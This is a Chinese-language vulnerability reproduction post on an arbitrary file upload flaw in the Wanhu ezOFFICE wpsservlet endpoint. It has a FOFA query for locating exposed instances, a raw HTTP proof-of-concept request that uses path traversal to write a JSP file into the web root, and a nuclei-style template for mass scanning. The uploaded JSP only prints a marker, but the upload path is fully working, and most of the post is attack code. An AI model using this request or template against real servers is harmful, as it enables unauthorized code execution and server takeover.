# 原创
：  漏洞复现--万户ezoffice wpsservlet任意文件上传

# 漏洞复现--万户ezoffice wpsservlet任意文件上传

## 免责声明：

**文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负责**

### 一：漏洞描述

万户ezOFFICE协同管理平台是一个综合信息基础应用平台。此系统wpsservlet存在任意文件上传。攻击者可上传恶意脚本文件获取服务器权限。

### 二：漏洞影响版本

万户ezoffice

### 三：网络空间测绘查询

fofa：<br/> `app="万户网络-ezOFFICE"`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/6912cb6e8728abcf0c64ee65d5374e2b.jpeg"/>

### 四：漏洞复现

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/d7252e19c7b81efc6545ec2f1164b9e5.jpeg"/><br/> POC:

```
POST /defaultroot/wpsservlet?option=saveNewFile&amp;newdocId=check&amp;dir=../platform/portal/layout/&amp;fileType=.jsp HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=55aeb894de1521afe560c924fad7c6fb
Content-Length: 200

--55aeb894de1521afe560c924fad7c6fb
Content-Disposition: form-data; name="NewFile"; filename="check.jsp"

&lt;% out.print("This website has a vulnerability!!!");%&gt;
--55aeb894de1521afe560c924fad7c6fb--

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/d3dc588de8f0f63ad5b41a43ef85f230.jpeg"/><br/> 访问/defaultroot/platform/portal/layout/check.jsp<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/326e6137cb5781cbc4d950c1f30e4a42.jpeg"/>

### 五：批量检测

```
id: wanhu-ezoffice-wpsservlet-upload

info:
  name: wanhu-ezoffice-wpsservlet-upload
  author: 芝士土拨鼠
  severity: high
  description: 万户ezOFFICE协同管理平台是一个综合信息基础应用平台。此系统wpsservlet存在任意文件上传。攻击者可上传恶意脚本文件获取服务器权限。

requests:
  - raw:
      - |-
        POST /defaultroot/wpsservlet?option=saveNewFile&amp;newdocId=check&amp;dir=../platform/portal/layout/&amp;fileType=.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
        Accept-Encoding: gzip, deflate
        DNT: 1
        Connection: close
        Upgrade-Insecure-Requests: 1
        Content-Type: multipart/form-data; boundary=55aeb894de1521afe560c924fad7c6fb
        Content-Length: 200

        --55aeb894de1521afe560c924fad7c6fb
        Content-Disposition: form-data; name="NewFile"; filename="check.jsp"

        &lt;% out.print("This website has a vulnerability!!!");%&gt;
        --55aeb894de1521afe560c924fad7c6fb--

      - |
        GET /defaultroot/platform/portal/layout/check.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Accept-Encoding: gzip
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'vulnerability'
      - type: status
        status:
          - 200

```
